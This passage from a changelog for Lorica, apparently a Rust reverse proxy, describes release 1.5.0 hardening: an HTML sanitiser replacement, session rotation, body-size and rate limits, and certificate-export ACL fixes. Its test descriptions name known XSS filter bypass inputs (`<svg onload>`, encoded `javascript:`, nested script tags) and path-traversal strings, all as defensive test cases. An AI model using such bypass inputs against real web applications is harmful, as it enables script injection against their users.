- Route rate-limit fields had no server-side bounds validation at all : `rate_limit_rps` and `rate_limit_burst` are `Option<u32>` on the `Route` model and the "0 = clear" sentinel was wired in both `create_route` (via `.filter(|&v| v != 0)`) and `update_route` (via an explicit `if 0 => None`), but no validator ever enforced an upper bound. A raw `curl POST {"rate_limit_rps": 10_000_000_000}` landed a `Some(u32::MAX)` on the route, and at request time the proxy's per-route limiter computes `effective_limit = rps + burst` as a `u32` in `proxy_wiring::rate_limit`, which would overflow and wrap around on pathological inputs. New `validate_rate_limit_bounds` helper enforces `0..=1_000_000` on both fields (same 1M ceiling as `max_connections` ; keeps the `rps + burst` sum well inside u32). Kept as a dedicated helper rather than growing `validate_route_numeric_bounds` past its existing `#[allow(clippy::too_many_arguments)]`. Both `create_route` and `update_route` now call the new helper after the numeric-bounds check. 6 new unit tests cover the zero-as-clear path (regression pin), the None path, in-range values, over-cap rejection on both fields, and the boundary case at exactly 1 000 000.
- Certificate export ACLs were not acting as an allowlist : the dashboard hint on the ACL section states `If no pattern matches, the cert is not exported`, and the empty-state hint reinforces `Without at least one pattern, no certificate is exported`. The exporter however only consulted `resolve_cert_export_acl` to RESOLVE an optional uid / gid override, then proceeded to export under the global defaults when `matched.is_none()` - so every live cert landed on disk regardless of the ACL table. Reported in production : operator configured three narrow `mail.*` ACLs expecting only those three hostnames to be exported, but the full cert store (a dozen unrelated hostnames) was written to the export directory. Fixed by early-returning a new `ExportOutcome::NoAclMatch` from `export_certificate` when no ACL pattern matches the cert's hostname. The export is skipped : no subdirectory, no PEM files, no chown attempt. Operators who want the previous "export everything" behaviour now declare an explicit `*` pattern in the ACL table (the UI already lists `*` as a supported pattern). `reexport_all` returns a `(ok, err, skipped)` tuple instead of `(ok, err)` and the reapply endpoint (`POST /api/v1/cert-export/reapply`) surfaces `skipped` as a first-class JSON field ; the dashboard status message now reads `N exported, M skipped (no ACL), K failed` so the operator understands an ACL-narrow result is deliberate rather than an exporter malfunction. OpenAPI schema updated. 3 new unit tests : `export_skipped_when_no_acl_pattern_matches` (regression pin mirroring the production scenario with generic `*.mail.example.org` ACL + unrelated `analytics.example.com` cert), `export_skipped_when_acls_empty`, `reexport_all_counts_skipped_certs`.
- Visual layout of the Certificate export settings section : the `<h3>` subsection headers had no styling in `CertExportTab.svelte`, so `Operator actions` sat flush against the ACL table above it (no margin, no separator) and the `Rescan now` + `Re-export all certificates now` buttons looked left-floating because only `.reapply-row` had any section-break styling. Added consistent h3 typography plus two explicit `<hr class="section-separator">` elements at the real category boundaries : after the `Save Export Settings` button, and between the end of the ACL block and `Operator actions`. Internal subsections (`Permissions`, the ACL add form on top of its list) no longer carry a separator since they belong to one coherent category. The section separator uses a darker colour (`--color-border-strong` with a `--color-text-muted` fallback) and `var(--space-6) / var(--space-4)` vertical margins so it reads as a real category break instead of a thin line that blends into the ACL table's bottom border. Both operator action buttons now align flush-right : `.orphans-actions` uses `justify-content: flex-end` mirroring `.settings-dialog-actions`, and `.reapply-inner` does the same with the status message kept to the left of the button so the reading order is "result, action". The reapply button label was renamed from `Re-export all certificates now` to `Re-export matching certificates now` and its hint reworded (`every certificate whose hostname matches a configured ACL pattern`) to match the new ACL-allowlist semantics - "all" would read as a lie now that the exporter honours the allowlist. Removed the now-redundant `border-top` from `.reapply-row` (the h3 + new hr handle the separator) and dropped the stray `border-top` on `.acl-add-form` (was separating the add form from its own section, which read as "new category" incorrectly).

## [1.5.0] - 2026-04-21

### Changed

- Doc coverage pass on the three Lorica-native public crates (v1.5.0 backlog #10). `#![warn(missing_docs)]` now lives at the crate root of `lorica-challenge`, `lorica-config`, and `lorica-api`, with a matching `///` comment on every previously-undocumented public item (~780 across 28 files). Covers the model types (`Route` + `Backend` + `Certificate` + `GlobalSettings` fields, `SlaBucket`, `LoadTestResult`, `CertExportAcl`, `BotProtectionConfig`, ...), the enum variants (`LoadBalancing`, `WafMode`, `HealthStatus`, `LifecycleState`, `NotificationChannel`, `PreferenceValue`, `PathMatchType`, `HeaderMatchType`), the diff / import / export DTOs, the challenge crate's error + mode + IP-prefix surface, and the whole `lorica-api` handler DTO tree (`RouteResponse` / `CreateRouteRequest` / `UpdateRouteRequest` plus every sub-DTO for path rules, header rules, traffic splits, forward-auth, mirror, response rewrite, mTLS, cert export, DNS providers, load tests, probes, SLA, settings, certs, backends, status, system, workers, auth, logs, waf, config, metrics). Style : terse one-liners mirroring the config model where semantics are already documented upstream, longer per-case context for types introduced at the API layer (`AppState`, `ExportError`, `Session`). `cargo clippy --tests --no-deps -- -D warnings` + `cargo test -p lorica-api -p lorica-config -p lorica-challenge` both pass (636 / 636 unit + integration tests green on the three crates).
- Test reliability + ACME coverage tightening (v1.5.0 backlog items #16 + #9). The `verdict_cache_*` tests in `lorica::bot` mutate process-global state (`VERDICT_CACHE: Lazy<DashMap>` + `VERDICT_CACHE_ORDER: Lazy<Mutex<VecDeque>>`) and used to race under `cargo test`'s parallel scheduler; `verdict_cache_fifo_evicts_oldest_when_full` was the first to surface a flake. Added `serial_test = "3"` as a dev-dependency and annotated the three cache-mutating tests with `#[serial(verdict_cache)]` so cargo test runs them sequentially without having to drop the whole process to `--test-threads=1`. ACME unit coverage expanded from 28 → 50 tests: `is_valid_dns_server` (the shell-injection filter on the `@server` argument passed to `dig`) gets 8 tests covering IPv4, IPv6-with-brackets, hostname accept paths + empty / too-long / shell-metacharacter / whitespace / quote-and-slash reject paths; the renewal filter logic is extracted behind a pure `should_auto_renew` predicate with 7 tests covering non-ACME rejection, opt-out rejection, `dns01-manual` skip, inside-window acceptance for http01 + dns01-cloudflare, exactly-at-threshold edge, outside-window rejection, and the already-expired case; the Cloudflare and OVH DNS challengers gain `pub(crate) fn with_base_url(...)` constructors that point at a `wiremock::MockServer` instead of the live API, covering happy-path POST/GET/DELETE shape + auth headers + JSON payload + 4xx error body surfacing + missing-record handling + the OVH signed-request round (GET `/auth/time`, POST `/record`, POST `/refresh`). Route53 still routes through `aws-sdk-route53` which needs a different mocking shape and is tracked as a follow-up in `docs/backlog.md`.

### Security

- Post-review hardening of the cert-export orphan sweep + rate-limit map. Three issues flagged on review and fixed in a follow-up pass : (1) `delete_orphan` now canonicalises the export root, rebuilds the target on top, refuses any entry whose `symlink_metadata()` reports a symlink or non-directory, and cross-checks the target's canonical form against the root prefix when it exists ; the previous parent-equality check caught string-level attacks but left an edge case where a symlink at `<root>/<name>` could escape. 2 new unit tests (Unix-only for the symlink arm) pin the rejection path and verify that the symlink target directory is untouched. (2) The rate-limit `HashMap` now runs an inline sweep of entries whose `window_start` is older than 300 s once the map grows past 1024 entries, so the bucket state cannot grow unbounded when Lorica is placed behind an aggressive forwarder that surfaces many rotating client IPs on the management plane. O(N) amortised stays O(1) in the common localhost-only path because the map never crosses the threshold there. 2 new tests (sweep-fires + live-entries-kept). (3) `cert_export::reexport_all` now runs its synchronous `fs::write` + `chmod` + `chown` loop inside `tokio::task::spawn_blocking` so a `POST /cert-export/reapply` on a store with hundreds of certs does not stall the Tokio executor for tens of milliseconds at a time ; every concurrent HTTP handler stays responsive during the re-export.
- WebSocket log-stream backpressure with drop metric (v1.5.0 audit finding LOW-12). A slow consumer on `GET /api/v1/logs/ws` used to silently drop messages on the inner `broadcast::Receiver` (`RecvError::Lagged(n)`) with only a `debug!` log. The handler now counts every dropped entry against a new Prometheus counter `lorica_logs_ws_dropped_total{reason="slow_client"}`, raises the log level to `warn!` with the running per-connection total, and terminates the connection with a WebSocket close code 1008 (Policy Violation) + reason text `"log stream too slow"` once the cumulative drops exceed 1000 — protecting Lorica from stuck-client backpressure amplification. Threshold is deliberately high so a brief network hiccup does not evict a live operator session ; a genuinely stuck client racks up drops fast enough to hit the cap within seconds.
- Session cookie rotation on password change (v1.5.0 audit finding LOW-13). `PUT /api/v1/auth/password` previously invalidated every session for the user EXCEPT the currently active one (the one the operator used to trigger the change). A stolen cookie held by an attacker on the same account survived the rotation for the remainder of its TTL. The handler now purges **every** session for the user (new `SessionStore::remove_all_for_user`, with a synchronous DB DELETE to close the memory→DB rehydration race) and mints a fresh session + `Set-Cookie` header on the 200 response, so the legitimate user stays logged in while any lingering stolen cookie is rejected on the next call. 1 new integration test covers the full flow (old cookie → 401, new cookie → 200 on the same browser).
- Bump `rand` to 0.9 across every Lorica-native direct dep (RUSTSEC-2026-0097 — `rand 0.8.5` is unsound with a custom logger that calls `rand::rng()` inside the logger closure; fixed in 0.9+). 0.10 was considered but rejected because the surrounding ecosystem (`argon2 0.5`, `rand_chacha 0.9` at its current minor) lags on the rand-core 0.10 migration, so 0.9 is the zero-cascade path of least friction. Call-site migration covers `lorica/src/bot.rs`, `lorica/src/proxy_wiring.rs::generate_request_id`, `lorica-api/src/server.rs::rotate_bot_hmac_on_cert_event`, `lorica-api/src/auth.rs::{hash_password, generate_random_password}`, `lorica-challenge/src/{pow, secret}.rs`, `lorica-shmem/src/hash.rs` — all switched from `RngCore::fill_bytes` to `TryRngCore::try_fill_bytes(...).expect("OS entropy")` (rand 0.9 made `OsRng` fallible to surface a hypothetical getrandom syscall failure ; we treat it as a hard error since Lorica cannot run without a working CSPRNG). `SaltString::generate` in `hash_password` uses `argon2::password_hash::rand_core::OsRng` to stay on argon2's bundled rand-core 0.6 (argon2 0.5 expects the older trait and mixing it with rand 0.9's OsRng would fail to compile). `ChaCha20Rng::from_rng(OsRng)?` becomes `ChaCha20Rng::from_os_rng()` (infallible, 0.9 API). `rand_chacha` bumped to 0.9 to match. The RUSTSEC advisory continues to show up in `cargo audit` via transitive `rand 0.8` pulled in by forks of Pingora (`lorica-runtime`, `lorica-limits`) and the `captcha` crate ; those are tracked as "awaiting upstream" in `docs/security/threat-model.md`.
- `/api/v1/system` response filtering to reduce info disclosure on an auth-gated but still compromisable session (v1.5.0 audit finding LOW-14). `proxy.version` is now masked to `MAJOR.MINOR` only (via a new `public_version` helper with 4 unit tests covering `1.5.0 → 1.5`, `2.0.13 → 2.0`, `1.5.0-rc.1 → 1.5`, malformed-input fallthrough); the patch version no longer leaks. `host.disk_root.mount_point` and `host.disk_data.mount_point` — which previously exposed the absolute filesystem paths (`/`, `/var/lib/lorica`) — are replaced by a short `mount_label` field carrying the role (`"root"` / `"data"`) that the dashboard already uses as the sublabel. Frontend `DiskUsage` TypeScript interface + Svelte `System` page updated in lockstep.
- Preserve source errors in `.map_err()` chains across api + config store (v1.5.0 audit finding MEDIUM-7). Previously 14 sites in `lorica-config/src/store/settings.rs` and `lorica-api/src/{settings, auth}.rs` used `.map_err(|_| Validation("invalid X".into()))` / `.map_err(|_| Internal("..."))`, swallowing the real parse / JSON / argon2 error and leaving operators to reproduce the bug in dev to diagnose it. Every site now threads the inner error into the message (`.map_err(|e| Validation(format!("invalid X {value:?}: {e}")))` or equivalent) so a bad settings value surfaces with its value + root cause in a single toast. The exceptions stay as opaque rejects: password verification in `auth.rs` (must not leak whether the hash parse or the verify failed — that would narrow the hash format; 2 sites) and the crypto module `lorica-config/src/crypto.rs` (AES-GCM encrypt / decrypt errors intentionally surface as generic "encryption failed" / "decryption failed" to avoid side-channel signal; 6 sites).
- Per-route body-size limits with a tighter 1 MiB global default (v1.5.0 audit MEDIUM-8). The previous uniform 10 MiB `DefaultBodyLimit` meant that `POST /lorica/bot/solve` (where a solution PoW fits in 40 bytes) and `/.well-known/acme-challenge/:token` accepted bodies 250 000× larger than they need, turning body-buffer exhaustion into a trivial DoS vector. Global axum ceiling now drops to 1 MiB ; state-mutating endpoints that legitimately carry larger payloads declare their own override via a per-route `.layer(DefaultBodyLimit::max(N))` : cert PEM upload 512 KiB, config TOML import (+ preview) 2 MiB, cert-export reapply 4 KiB, settings PUT 64 KiB, route CRUD 128 KiB (covers routes with 50+ path rules + inline header maps), ACME provision/renew 16 KiB, WAF custom rule 8 KiB. 2 new integration tests drive an oversize payload and assert 413 Payload Too Large both on the per-route override (WAF custom rule) and on the global fallback (POST /backends).
- Per-endpoint rate limits on the state-mutating management plane (v1.5.0 audit HIGH-3). `RateLimiter` now carries N named buckets with heterogeneous policies (previously single-bucket login 5/60 s). A new axum middleware layer `rate_limit_middleware` is attached per-route via `from_fn_with_state` with a bucket + limit + window configuration. Policies : `PUT /auth/password` 3/60 s, `POST /config/import` + `POST /config/import/preview` 3/60 s, `POST /acme/provision*` + `POST /certificates/:id/renew` 3/60 s (Let's Encrypt quota discipline), `POST /certificates` + `POST /certificates/self-signed` 20/60 s, `POST /cert-export/reapply` 5/60 s, `PUT /settings` 30/60 s, route CRUD (`POST/PUT/DELETE /routes*`) 100/60 s, ACL CRUD (`POST/DELETE /cert-export/acls*`) 100/60 s. Limits calibrated for realistic operator activity (e2e smoke was tripping an earlier 30/60 s limit on /routes after ~30 route mutations in sequence). `GET /certificates/:id/download` moves from the shared "login" bucket to a dedicated `cert_download` 5/60 s bucket so a download flood cannot block operator login. `ApiError::RateLimited` now carries the `retry_after` value and the response emits a `Retry-After` header (RFC 6585). 9 new unit tests + 2 integration tests cover window exhaustion + Retry-After format + inter-bucket isolation + the isolation between named buckets and the legacy login bucket.
- Migrated the direct PEM parser from `rustls-pemfile` (unmaintained since 2022, RUSTSEC-2025-0134) to `rustls-pki-types` (maintained by the rustls team, aligned 1:1 with the rest of the TLS stack). The single Lorica-native call site in `lorica/src/mtls.rs` now uses `CertificateDer::pem_slice_iter` to walk a CA bundle ; `rustls-pemfile` is no longer a direct dependency of the `lorica` crate. The advisory remains visible transitively through the forked `lorica-tls` (from upstream Pingora), tracked in `docs/security/threat-model.md` and waiting for the upstream migration ; no Lorica-native code goes through the advisory path any more. 11 mtls E2E tests + 5 mtls unit tests remain green.
- Replaced the 3-pass regex HTML sanitiser (`<script>`, `on*=`, `javascript:`) applied to operator-supplied `error_page_html` with an `ammonia` whitelist-based sanitiser (v1.5.0 audit finding HIGH-1). Regex-based HTML filters are historically contournable via `<svg onload>`, encoded `javascript&#58;`, nested `<scr<script>ipt>`, and malformed HTML ; `ammonia` parses through `html5ever` and walks the DOM against an allow-list, so the attack surface collapses onto what the Servo team already hardens. Policy: default ammonia allow-list + explicit allow for structural tags (`html`, `head`, `body`, `title`) so an operator can still supply a full standalone document ; URL schemes capped to `http`, `https`, `mailto` (rejects `data:`, `vbscript:`, `file:`, plus the usual `javascript:`) ; `<style>`, `<link>`, `<iframe>`, `<object>`, `<embed>`, `<meta>` are now rejected (kept out of the allow-list). 128 KiB input cap enforced upstream by `validate_error_page_html` in `lorica-api` (unchanged). 15 new unit tests cover `<svg onload>`, `<iframe>`, `<object>`, `<embed>`, `<style>`, `<link>`, `<meta http-equiv="refresh">`, `data:` URIs, `vbscript:` URIs, HTML-encoded `javascript&#58;`, the nested `<scr<script>ipt>` bypass, and the preserved-happy-paths (structural tags, `mailto:`, `https://` link).

### Added

- Orphan cleanup flow for the cert-export zone (v1.5.0 backlog #13). The exporter leaves the on-disk `<cert_export_dir>/<hostname>/` subdirectory in place when an operator deletes the matching certificate — a consumer that cached the path keeps reading the stale bundle until it flips. That behaviour is intentional, but it meant the only way to recover the residual bytes was `ssh` + `rm -rf`. New `GET /api/v1/cert-export/orphans` endpoint walks the export root and returns every per-hostname subdirectory whose name does not map back to a live `Certificate` row (either the sanitised `hostname` OR the `cert-{id}` fallback used for wildcard / non-ASCII domains), with each entry carrying its modification timestamp and the summed size of the four expected PEM files so the dashboard can show the stale bytes before offering deletion. Companion `DELETE /api/v1/cert-export/orphans/{name}` endpoint removes a single subdirectory, re-validating the name through `sanitize_hostname` (rejects `..`, `/`, empty, leading dot, any non-ASCII-alphanumeric-apart-from-`-_.`) AND re-checking against the live-cert set before any `fs::remove_dir_all` call so a racy delete between the scan and the click cannot blow away a freshly-issued cert directory. Wired under the session-gated protected tree + rate-limited on the shared `cert_export_acls` bucket (100/60 s). Dashboard Settings → Cert export tab gains an "Orphan directories" section with a rescan button, per-row delete button, and a `ConfirmDialog` explaining that `privkey.pem` will be removed and any consumer still reading from the path will start failing. 9 new unit tests cover scanner empty-when-disabled + dangling-subdir detection + non-sanitisable-entry skipping + missing-root graceful path, and `delete_orphan` idempotence + path-traversal rejection (including `..`, `foo/../bar`, `/etc`) + live-cert refusal + disabled-feature rejection. `docs/security/cert-export-threat-model.md` updated to describe the new explicit-consent flow.
- Packaging + systemd + threat-model documentation for the cert-export zone. `dist/lorica.service` gains explicit comments next to `ReadWritePaths=` pointing out that `/var/lib/lorica/exported-certs` is covered by default (and that a non-default `cert_export_dir` needs to be added) and next to the capability lines explaining why `CAP_CHOWN` is the optional opt-in when the operator wants the exporter's `chown` call to actually take effect (without it, the writer falls back to `ExportOutcome::PermissionsSkipped`). `dist/build-deb.sh` + `dist/rpm/lorica.spec` pre-create `/var/lib/lorica/exported-certs` with mode `0o750` + owner `lorica:lorica` so the dir exists before the first boot and the systemd `ProtectSystem=strict` sandbox covers it out of the box. New `docs/security/cert-export-threat-model.md` walks through the eight threat scenarios the design mitigates (world-readable key material, path traversal in ACL pattern, renewal / reader race, feature-disabled leak, unauthorised download over the management API, ACL wildcard-collision ambiguity, missing `CAP_CHOWN` silent downgrade, ENOSPC cascade into the ACME flow), the explicit non-goals (no PKCS#12, no at-rest encryption, no orphan cleanup, no remote mirror), and a six-step deployment checklist. README section `:lock: Security` gains a one-paragraph description of the feature with a pointer to the threat model doc; README REST API Reference table lists the four new cert-export endpoints + the `/certificates/:id/download` route alongside the existing certificate endpoints.
- E2E Docker smoke test for the certificate filesystem export zone under a new `cert-export` profile. `docker compose --profile cert-export run --rm cert-export-smoke` drives the full operator path end-to-end: login + first-run password rotation, `PUT /api/v1/settings` to enable + point the export dir + set restrictive file/dir modes (0o640 / 0o750), `POST /api/v1/certificates/self-signed` to mint a cert, then stats the four expected PEM files (`cert.pem`, `chain.pem`, `fullchain.pem`, `privkey.pem`) under the shared `lorica-cert-export-data` volume (mounted read-only into the test-runner at `/lorica-data` so there is no `docker exec` hop), asserts the per-file mode landed at `0o640` and the per-hostname directory at `0o750`, parses the first line of each file to confirm a PEM header is present, checks `fullchain.pem` has >= CERTIFICATE markers than `cert.pem`, and verifies `privkey.pem` starts with a `PRIVATE KEY-----` marker (guards against an accidental cert / key swap). Then exercises the four new `cert-export` endpoints: `POST /cert-export/acls` (happy path + `400` rejections for empty + interior-wildcard patterns), `GET /cert-export/acls` (round-trip pattern / UID / GID), `POST /cert-export/reapply` (`enabled=true`, `exported>=1`, `failed=0`), and `DELETE /cert-export/acls/{id}` (idempotent). Finally flips `cert_export_enabled=false` and asserts the reapply endpoint reports `enabled=false` + `exported=0` so the off-path cannot silently leak. 25 assertions on a real Docker run. Added as Phase 3 of `run.sh` with an opt-out `--skip-cert-export` flag for faster local loops.
- Certificate export settings tab in the dashboard (follow-up to the cert-export writer + ACL engine). New `components/settings-tabs/CertExportTab.svelte` section under Settings covers every knob the `lorica-api::cert_export` path reads: enable toggle, absolute export-directory input, owner UID / group GID inputs, octal file / directory mode inputs, an inline ACL editor (add pattern + UID + GID, delete with `ConfirmDialog`), and a "Re-export all certificates now" button wired to the new `POST /api/v1/cert-export/reapply` endpoint. Each input validates on blur + input with a matching helper in `lib/validators.ts`: `validateAbsolutePath` (4096-char cap, `/..` traversal rejected, control chars rejected), `validateOctalMode` + `parseOctalMode` (accepts `640`, `0640`, `0o640`; rejects non-octal digits and anything past `0o777`), `validatePosixId` (u32 range), and `validateCertExportPattern` (mirror of the backend `validate_pattern` - exact hostname, leading `*.suffix` wildcard, or bare `*`, with the same DNS-label and 253-char caps). A red warning banner at the top of the section makes the plaintext-key-on-disk trade-off explicit before the operator flips the enable toggle. ACL list auto-refreshes every 30 s so two admins editing the same page do not drift. New backend `UpdateSettingsRequest` fields + per-field validation (`cert_export_dir` absolute + traversal, modes capped at 9 bits, empty-string clears the path) wired into `update_settings` with a matching unit test matrix (round-trip, relative-path rejection, traversal rejection, mode-out-of-range rejection, clear-on-empty). Frontend `Settings.svelte` surfaces + persists the six `cert_export_*` fields alongside the other global settings. Three new cert-export endpoints (`GET/POST /api/v1/cert-export/acls`, `DELETE /api/v1/cert-export/acls/{id}`, `POST /api/v1/cert-export/reapply`) + the download endpoint are now also documented in `lorica-api/openapi.yaml`. 26 new frontend vitest cases cover every validator branch; 5 new backend integration tests cover the settings round-trip and rejection paths.
- Certificate download UI in the dashboard. New split-menu button in the Certificates list (next to Renew / Delete) opens a menu with four options: "Bundle (cert + key)", "Certificate only", "Certificate + chain", "Private key (sensitive)". The two options that include the private key (Bundle and Private key) trigger a `ConfirmDialog` with an explicit "this leaves Lorica in plain text, store it in a secure location, also audit-logged server-side" message so one click never silently drops a private key. Downloads go through a new `api.downloadCertificate(id, part)` helper that bypasses the usual JSON-envelope wrapper, uses `fetch` + `Blob` + a hidden `<a download>` so the browser's native file flow picks up the `Content-Disposition` filename served by the API.
- Per-hostname-pattern ACL for the certificate export zone (`cert_export_acls` table). Lets an operator override the default `cert_export_owner_uid` / `cert_export_group_gid` on a per-cert basis: `*.prod.mibu.fr` can land with gid=2001 (read by the Ansible user) while `*.internal` lands with gid=3001 (read by a backup job) and every other cert inherits the global default. One ACL row = one rule with `hostname_pattern`, optional `allowed_uid`, optional `allowed_gid`. Pattern language is intentionally simple (exact match, leading-`*.` wildcard, catch-all `*`) - a regex would turn operator typos into filesystem permission bugs that are hard to debug. Specificity ranking picks the most specific match when several apply (exact > longer wildcard suffix > shorter wildcard suffix > catch-all). New idempotent V38 migration creates the table; store CRUD (`create_cert_export_acl`, `list_cert_export_acls`, `delete_cert_export_acl`) is paired with model helpers `pattern_matches`, `specificity`, `resolve_cert_export_acl` exported from `lorica_config::models`. Exporter integration wires `resolve_cert_export_acl` into `export_certificate` so each cert's chmod / chown uses the matched ACL's uid / gid (with per-side `None`-inherits-global semantics so an operator can override just the group without touching the owner). 10 new unit tests across model (5), store (2), and exporter (3).
- Certificate filesystem export zone (`GlobalSettings.cert_export_*` fields). When `cert_export_enabled` is true and `cert_export_dir` is set, every cert creation path (manual upload, self-signed generation, ACME HTTP-01, ACME DNS-01, manual DNS-01 provisioning) mirrors the PEM payload under `<dir>/<sanitised-hostname>/{cert,chain,fullchain,privkey}.pem` for external tooling (Ansible, HAProxy sidecar, backup job) to read straight off disk without hitting the HTTP API. New `lorica-api::cert_export` module implements: atomic writes (stage to `.tmp`, `fsync`, `rename`; cross-mount `EXDEV` fallback copies then renames on the destination filesystem), per-file and per-dir `chmod` + `chown` with configurable owner uid / group gid / octal modes (defaults 0640 files / 0750 dirs), fail-soft error handling (any write failure emits a `tracing::warn!` but never blocks the ACME renewal - the cert is still persisted in the DB), ENOSPC detection surfaced as a dedicated `DiskFull` variant, and capability-aware `PermissionsSkipped` outcome when `chown` hits `EPERM` (Lorica running without `CAP_CHOWN`). Hostname sanitiser rejects wildcards / leading dots / path traversal with a fallback to the opaque cert id so attacker-controlled bytes never land on the filesystem. `chown` goes through `nix::unistd::chown` (safe wrapper) to preserve the crate-wide `deny(unsafe_code)`. 8 new unit tests cover the four-file layout, the fullchain / chain / leaf split, the disabled-no-op path, the wildcard-fallback path, the hostname rejection branches, and the non-ASCII strip.
- Certificate download endpoint (`GET /api/v1/certificates/:id/download?part={cert|key|chain|bundle}`). Lets an operator pull a PEM copy of an issued certificate from the dashboard - useful for backup / migration / handing the same cert to an external tool (Ansible, HAProxy sidecar, ...). Auth-gated via the existing `protected_routes` layer (the whole `/api/v1` tree requires a valid session cookie). Rate-limited per client IP on a dedicated `cert_download` bucket (5 downloads / 60 s) so a runaway script cannot exfiltrate the whole store in a tight loop. Each download writes a `tracing::warn!` audit line with the client IP, cert id, domain, and selected part so the drop shows up in the access log. `Content-Disposition` filename is built from a sanitised domain (ASCII alphanumeric + `-_.` only, no leading dot, no `..` traversal); wildcard domains, punycode, and empty / malformed domains fall back to the opaque cert id so a download can never serve a file named from attacker-controlled bytes. 4 new unit tests in `certificates::download_tests` cover the hostname / wildcard-rejection / traversal-rejection / non-ASCII sanitize path.
- Route `group_name` dashboard UI: input in `GeneralTab` under Hostname aliases with the same blur + input validator pattern as every other field, a group-filter dropdown next to the search bar (auto-populated from the unique group names present on the live routes list), and a colored pill next to the hostname whose color is derived from a deterministic FNV-1a hash of the name (same group name always renders the same color without the operator picking one). Plus shared `validateGroupName` in `validators.ts` wired into both `validateRouteForm` / `validateRouteFormWithTab` submit contracts, matching api types (`Route.group_name`, `CreateRouteRequest.group_name`, `UpdateRouteRequest.group_name`), and 5 new vitest cases pinning the accepted / rejected alphabets.
- E2E Docker smoke coverage for `group_name` in the default `tests-e2e-docker/test-runner/run-tests.sh` flow: sets `group_name` on two routes via `PUT`, re-fetches to confirm round-trip, lists `/api/v1/routes?group=e2e-prod` and asserts the filter narrows to the one expected route, then posts an uppercase value and asserts the server returns 400. Runs alongside the 200+ existing assertions on every `run.sh` invocation; no new profile required.
- Route `group_name` field (free-form classification label, mirror of `Backend.group_name`). Lets operators filter / group routes in the dashboard (prod / staging / homelab / legacy, etc.) without inventing a hostname convention. Pure metadata: the proxy hot path never reads it, it is not a Prometheus label (bounded-cardinality concern), it is not surfaced in OTel span tags. New V37 idempotent migration (`ALTER TABLE routes ADD COLUMN group_name TEXT NOT NULL DEFAULT ''`) + field on `Route` struct + round-trip through `store::routes` (INSERT / UPDATE / SELECT all carry it) + `diff.rs::route_eq` so a config import surfaces a classification change. Validator `validate_group_name` in `lorica-api::routes::crud` enforces the same alphabet as the Linux hostname convention (ASCII lowercase, digits, `-`, `_`, 1..=64 chars) with empty = ungrouped. New `GET /api/v1/routes?group={label}` query param for server-side filtering. 4 new unit tests in `group_name_validation_tests` + 2 new round-trip tests in `lorica-config::tests::tests`.
- Cleanup pass on clippy warnings that the existing `-D warnings` gate was not running against: pre-compiled the `$N` capture-group regex in `build_response_rewrite` (`std::sync::OnceLock` instead of compiling on every rule), collapsed the `|| c == '/'` chain in `validate_redirect_to` onto a char-array `.find`, added `#[allow(clippy::too_many_arguments)]` with a justification on `validate_route_numeric_bounds` (single-site fan-in of the route numeric fields - splitting would scatter the bounds across helpers), reworded doc comments to avoid markdown-list parsing ambiguity. `cargo clippy -p lorica-config -p lorica-api --tests --no-deps -- -D warnings` is now green.
- API-side validation for `redirect_hostname` (latent footgun surfaced during the path-rule redirect investigation). The proxy builds canonical-host redirects as `{scheme}://{redirect_hostname}{path}{?query}`, treating the field as a bare DNS hostname. Before this change, pasting a full URL like `https://example.com/foo` was silently accepted by both `POST` and `PUT /api/v1/routes` and produced a malformed Location header (`https://https://example.com/foo/...`) on every request that hit the route. New `validate_redirect_hostname` in `lorica-api` rejects URL schemes, paths, trailing slashes, ports, queries, fragments, whitespace, consecutive dots, leading / trailing dots or dashes, DNS labels > 63 chars, total length > 253 chars, and non-ASCII or underscore characters, each with a field-specific error message so the dashboard can show the user exactly what is wrong. Front-end mirror `validateRedirectHostname` runs on blur (inline error under the input) and on submit (same `validateRouteForm` / `validateRouteFormWithTab` path that already guards the primary hostname field) so the mistake surfaces in the drawer instead of only at API call time. 13 new backend unit tests in `redirect_hostname_validation_tests` + 10 new frontend vitest cases cover every rejection branch and the "empty = clear the field" contract both callers rely on.
- Error-feedback completeness pass (follow-up to the guard-rails coverage). Five UX / plumbing items were finished in one go so the operator never faces a save failure where the form still needs to be re-filled: (1) Live-validation banner + disabled Save button in the route drawer - `validateRouteFormWithTab` is now computed via `$derived` on every keystroke, so the Save button stays disabled while `message` is non-empty and an inline red `.validation-banner` surfaces the offending text and a "Go to {tab}" button. (2) `jumpToErrorTab` scrolls the first `.field-error` / `.invalid` element into view after switching tabs and focuses the related input, so the operator lands directly on the broken field instead of hunting through a long tab. (3) `oninput` handlers duplicated onto every `onblur` handler across 13 components (65 inputs touched via a Node-driven regex pass so the transformation was uniform and review-friendly) - blur-time errors now clear as soon as the operator types the fix, rather than sticking until the next blur. (4) Covered three previously unvalidated components: `Backends.svelte` (`weight`, `health_check_interval`, `health_check_path`), `HeaderRulesTab` (per-row `header_name` via RFC 7230 token + regex `value` when `match_type === 'regex'`), `CanaryTab` (per-row `name` length / control-char, `weight_percent` bounds, and the "non-zero weight needs a backend" rule) with the same `{@const errs = ...}` pattern used on `PathRulesTab`. (5) `SettingsNotifications` webhook URL now runs `validateUrl` on blur + input (previously only `<input type="url" required>`), auth-header field rejects CR / LF / NUL and caps at 4096 chars. (6) `SecurityPresetsTab` preset name (ASCII identifier 1..=64) + preset headers (shared `validateHeadersMapText`) gain blur-time inline errors. (7) Frontend vitest coverage catches up on Batch 5 + 7 validators (`validateRoutePath`, `validateHostnameAliasList`, `validateErrorPageHtml` - 12 new cases). (8) Backend coverage catches up on `otlp_service_name` control-char rejection and `sla_purge_retention_days` upper cap - 2 new integration tests in `lorica-api/src/tests.rs`.
- Blur-time inline error feedback across every validated field in the dashboard. The guard-rails pass (Batches 0-7) added validators on both sides of the wire; this follow-up wires the front-end `validators.ts` helpers into on-blur handlers on every text / number / textarea input that has a validator, surfacing an inline `.field-error` span right under the offending input so the operator sees the problem as they leave the field rather than at save time (which, on a long form, means scrolling back through several tabs to hunt for a red border). Coverage: `GeneralTab` (`path_prefix`, `hostname_aliases`, `return_status`, `error_page_html`), `TransformTab` (`strip_path_prefix`, `add_path_prefix`, `path_rewrite_replacement`, `cors_max_age_s`), `PathRulesTab` (per-row `path`, `redirect_to`, `return_status`, `response_headers`, `response_headers_remove`, `rate_limit_rps`, `rate_limit_burst` via a `{@const errs = ruleErrors(rule)}` scoped map so the reactive system re-computes errors for the whole list on any edit without parallel state arrays), `SecurityTab` (`forward_auth_timeout_ms`, `mtls_ca_cert_pem`, `mtls_allowed_organizations`), `ProtectionTab` (`rate_limit_capacity`, `rate_limit_refill_per_sec`, `max_connections`, `slowloris_threshold_ms`, `max_body_mb`, `auto_ban_threshold`, 